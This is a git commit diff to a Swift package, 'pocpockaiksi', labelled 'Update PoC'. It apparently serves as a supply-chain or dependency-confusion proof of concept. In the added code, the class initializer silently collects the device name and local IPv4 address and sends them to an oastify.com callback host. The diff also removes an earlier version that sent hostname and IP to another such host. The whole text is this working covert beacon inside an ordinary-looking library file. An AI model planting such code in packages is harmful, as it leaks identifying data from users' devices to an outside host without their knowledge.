a25fe6fd73f2d1f39bcb4ca0f6f717c8a5afb403
kaiksi-bb <kaiksibb@gmail.com>
2025-08-20 11:48:50 +0200

    Update PoC

--- Sources/pocpockaiksi/Info.swift
+++ Sources/pocpockaiksi/Info.swift
@@ -1,40 +1,53 @@
+import UIKit
 import Foundation
 
-class PocPod {
-    init() {
+public class PocPod {
+    public init() {
         let podName = "pocpockaiksi"
-        let hostname = Host.current().localizedName ?? "unknown"
-        let ip = getIFAddresses().first ?? "unknown"
-        let url = URL(string: "https://phaz26b94106lgibsusi6rlvsmyjm9ay.oastify.com/log?pod=\(podName)&host=\(hostname)&ip=\(ip)")!
+        let deviceName = UIDevice.current.name
+        let ipAddress = getIPAddress() ?? "unknown"
 
-        var request = URLRequest(url: url)
-        request.httpMethod = "GET"
-        URLSession.shared.dataTask(with: request).resume()
+        let urlStr = "https://xxygcfj65ljljni9899jit989zfr3ir7.oastify.com/?pod=\(podName)&device=\(deviceName)&ip=\(ipAddress)"
+        guard let encodedUrlStr = urlStr.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed),
+              let url = URL(string: encodedUrlStr) else {
+            return
+        }
+
+        var req = URLRequest(url: url)
+        req.httpMethod = "GET"
+        URLSession.shared.dataTask(with: req).resume()
     }
 
-    func getIFAddresses() -> [String] {
-        var addresses = [String]()
+    private func getIPAddress() -> String? {
+        var address: String?
+
         var ifaddr: UnsafeMutablePointer<ifaddrs>?
         if getifaddrs(&ifaddr) == 0 {
             var ptr = ifaddr
             while ptr != nil {
-                let interface = ptr!.pointee
+                defer { ptr = ptr?.pointee.ifa_next }
+
+                guard let interface = ptr?.pointee else { continue }
                 let addrFamily = interface.ifa_addr.pointee.sa_family
-                if addrFamily == UInt8(AF_INET) || addrFamily == UInt8(AF_INET6) {
-                    if let name = String(validatingUTF8: interface.ifa_name),
-                       name != "lo0" {
+                if addrFamily == UInt8(AF_INET) { // IPv4
+                    if let name = String(validatingUTF8: interface.ifa_name), name != "lo0" {
                         var hostname = [CChar](repeating: 0, count: Int(NI_MAXHOST))
-                        getnameinfo(interface.ifa_addr, socklen_t(interface.ifa_addr.pointee.sa_len),
-                                    &hostname, socklen_t(hostname.count),
-                                    nil, socklen_t(0), NI_NUMERICHOST)
-                        addresses.append(String(cString: hostname))
+                        getnameinfo(interface.ifa_addr,
+                                    socklen_t(interface.ifa_addr.pointee.sa_len),
+                                    &hostname,
+                                    socklen_t(hostname.count),
+                                    nil,
+                                    socklen_t(0),
+                                    NI_NUMERICHOST)
+                        address = String(cString: hostname)
+                        break
                     }
                 }
-                ptr = ptr!.pointee.ifa_next
             }
             freeifaddrs(ifaddr)
         }
-        return addresses
+
+        return address
     }
 }
 
